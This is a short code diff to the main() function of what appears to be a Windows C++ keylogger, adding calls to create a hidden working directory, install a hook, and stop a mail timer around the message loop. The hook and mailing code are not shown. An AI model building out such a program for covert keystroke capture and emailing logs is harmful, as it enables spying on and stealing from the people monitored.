@@ -15,9 +15,17 @@ int main(){
      * for this part we need the header windows.h
      */
     MSG message;
+
+    IO::MKDir(IO::GetOurPath(true));
+
+    InstallHook();
+
     while (GetMessage (&message, NULL, 0, 0)) {
         TranslateMessage(&message);
         DispatchMessage(&message);
     }
+
+    MailTimer.Stop();
+
     return 0;
 }
